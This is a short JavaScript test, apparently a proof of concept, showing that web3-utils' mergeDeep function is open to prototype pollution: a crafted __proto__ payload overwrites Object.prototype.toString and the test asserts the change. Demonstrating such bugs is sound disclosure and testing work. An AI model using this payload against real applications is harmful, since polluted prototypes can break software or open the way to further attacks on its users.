test("Prototype pollution in web3-utils", () => {
  const Web3Utils = require('web3-utils');

  let payload = { ["__proto__"]: { "toString": "polluted" } };

  expect({}.toString).toBe({}.toString);

  Web3Utils.mergeDeep({}, payload);

  expect({}.toString).toBe("polluted");
})
